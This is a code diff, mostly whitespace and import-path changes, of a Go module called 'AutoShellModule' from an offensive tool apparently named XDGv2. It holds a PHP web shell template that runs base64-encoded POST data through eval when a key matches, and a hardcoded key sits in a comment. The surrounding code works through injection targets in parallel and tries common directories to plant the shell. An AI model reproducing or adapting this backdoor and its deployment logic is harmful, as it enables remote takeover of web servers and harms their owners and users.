@@ -1,11 +1,11 @@
 package modules
 
 import (
+	"XDGv2/injection"
+	"XDGv2/manager"
+	"XDGv2/qtui"
+	"XDGv2/utils"
 	"fmt"
-	"git.quartzinc.dev/Zertex/XDGv2/injection"
-	"git.quartzinc.dev/Zertex/XDGv2/manager"
-	"git.quartzinc.dev/Zertex/XDGv2/qtui"
-	"git.quartzinc.dev/Zertex/XDGv2/utils"
 	"github.com/paulbellamy/ratecounter"
 	"github.com/spf13/viper"
 	"github.com/therecipe/qt/widgets"
@@ -17,13 +17,13 @@ import (
 )
 
 type AutoShellModule struct {
-	Index int
-	Payload int
+	Index          int
+	Payload        int
 	InjectableChan chan *injection.Injection
-	ShellChan chan string
-	UILock *sync.RWMutex
-	UIMap map[int]*injection.Injection
-	UIMutex sync.Mutex
+	ShellChan      chan string
+	UILock         *sync.RWMutex
+	UIMap          map[int]*injection.Injection
+	UIMutex        sync.Mutex
 }
 
 var AutoSheller *AutoShellModule
@@ -36,7 +36,6 @@ if ($_GET['q']=='1'){echo '200'; exit;}
 if($_GET['key']=='%s')eval(base64_decode($_POST['fack']));
 if(md5($_GET['key'])=='%s')eval(base64_decode($_POST['fack']));
 ?>` // original key: sdfadsgh4513sdGG435341FDGWWDFGDFHDFGDSFGDFSGDFG
-
 
 func (am *AutoShellModule) Start(injectables []*injection.Injection) {
 	manager.PManager.ResetCtx()
@@ -60,7 +59,7 @@ func (am *AutoShellModule) Start(injectables []*injection.Injection) {
 	wg := sync.WaitGroup{}
 	wg.Add(threads)
 	for i := 0; i < threads; i++ {
-		utils.GlobalSem<-0
+		utils.GlobalSem <- 0
 		go func() {
 			defer func() {
 				wg.Done()
@@ -72,7 +71,7 @@ func (am *AutoShellModule) Start(injectables []*injection.Injection) {
 				}
 				am.UIMutex.Lock()
 				count := qtui.Main.AutoShellTable.RowCount()
-				qtui.Main.AutoShellTable.SetRowCount(count+1)
+				qtui.Main.AutoShellTable.SetRowCount(count + 1)
 				qtui.Main.AutoShellTable.SetItem(count, 0, widgets.NewQTableWidgetItem2(inj.Base.String(), 0))
 				am.UIMap[count] = inj
 				am.UIMutex.Unlock()
@@ -98,7 +97,7 @@ func (am *AutoShellModule) Start(injectables []*injection.Injection) {
 					}
 					continue
 				} else {
-					qtui.Main.AutoShellTable.SetItem(count,1, widgets.NewQTableWidgetItem2("N/A", 0))
+					qtui.Main.AutoShellTable.SetItem(count, 1, widgets.NewQTableWidgetItem2("N/A", 0))
 				}
 
 				for _, potential := range injection.CommonDirectories {
@@ -118,12 +117,12 @@ func (am *AutoShellModule) Start(injectables []*injection.Injection) {
 	var inj *injection.Injection
 	for am.Index, inj = range injectables {
 		select {
-		case <- utils.Done:
+		case <-utils.Done:
 			goto done
 		case am.InjectableChan <- inj:
 		}
 	}
-	done:
+done:
 	close(am.InjectableChan)
 	f := make(chan interface{})
 	go func() {
@@ -133,10 +132,10 @@ func (am *AutoShellModule) Start(injectables []*injection.Injection) {
 	select {
 	case <-f:
 		am.Index = 0
-	case <- utils.Kill:
+	case <-utils.Kill:
 	}
 }
 
 /*
 
-*/
+ */
